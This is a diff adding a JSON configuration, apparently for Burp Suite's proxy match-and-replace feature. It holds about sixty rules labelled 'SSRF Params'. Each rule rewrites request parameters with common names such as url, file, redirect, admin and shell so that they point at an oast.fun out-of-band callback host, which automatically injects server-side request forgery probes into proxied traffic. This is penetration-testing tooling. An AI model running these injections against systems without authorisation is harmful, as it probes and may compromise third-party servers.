@@ -1,0 +1,502 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^access.*$",
+                "string_replace": "access=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^adm.*$",
+                "string_replace": "adm=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^admin.*$",
+                "string_replace": "admin=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^alter.*$",
+                "string_replace": "alter=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^callback.*$",
+                "string_replace": "callback=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^cfg.*$",
+                "string_replace": "cfg=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^clone.*$",
+                "string_replace": "clone=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^continue.*$",
+                "string_replace": "continue=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^create.*$",
+                "string_replace": "create=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^data.*$",
+                "string_replace": "data=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^dbg.*$",
+                "string_replace": "dbg=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^debug.*$",
+                "string_replace": "debug=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^delete.*$",
+                "string_replace": "delete=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^dest.*$",
+                "string_replace": "dest=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^dir.*$",
+                "string_replace": "dir=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^disable.*$",
+                "string_replace": "disable=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^doc.*$",
+                "string_replace": "doc=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^document.*$",
+                "string_replace": "document=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^domain.*$",
+                "string_replace": "domain=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^edit.*$",
+                "string_replace": "edit=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^enable.*$",
+                "string_replace": "enable=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^exec.*$",
+                "string_replace": "exec=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^execute.*$",
+                "string_replace": "execute=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^feed.*$",
+                "string_replace": "feed=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^file.*$",
+                "string_replace": "file=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^filename.*$",
+                "string_replace": "filename=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^folder.*$",
+                "string_replace": "folder=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^grant.*$",
+                "string_replace": "grant=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^host.*$",
+                "string_replace": "host=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^html.*$",
+                "string_replace": "html=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^img.*$",
+                "string_replace": "img=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^load.*$",
+                "string_replace": "load=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^make.*$",
+                "string_replace": "make=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^modify.*$",
+                "string_replace": "modify=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^navigation.*$",
+                "string_replace": "navigation=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^next.*$",
+                "string_replace": "next=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^open.*$",
+                "string_replace": "open=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^out.*$",
+                "string_replace": "out=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^page.*$",
+                "string_replace": "page=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^path.*$",
+                "string_replace": "path=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^pg.*$",
+                "string_replace": "pg=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^php_path.*$",
+                "string_replace": "php_path=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^port.*$",
+                "string_replace": "port=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^redirect.*$",
+                "string_replace": "redirect=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^reference.*$",
+                "string_replace": "reference=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^rename.*$",
+                "string_replace": "rename=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^reset.*$",
+                "string_replace": "reset=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^return.*$",
+                "string_replace": "return=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^root.*$",
+                "string_replace": "root=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^shell.*$",
+                "string_replace": "shell=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^show.*$",
+                "string_replace": "show=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^site.*$",
+                "string_replace": "site=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^style.*$",
+                "string_replace": "style=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^test.*$",
+                "string_replace": "test=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^to.*$",
+                "string_replace": "to=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^toggle.*$",
+                "string_replace": "toggle=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^uri.*$",
+                "string_replace": "uri=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^url.*$",
+                "string_replace": "url=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^val.*$",
+                "string_replace": "val=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^validate.*$",
+                "string_replace": "validate=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^view.*$",
+                "string_replace": "view=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            },
+            {
+                "comment": "SSRF Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^window.*$",
+                "string_replace": "window=http://cgm3xq62vtc0000x2dpggekb65oyyyyyb.oast.fun&tmp"
+            }
+        ]
+    }
+}
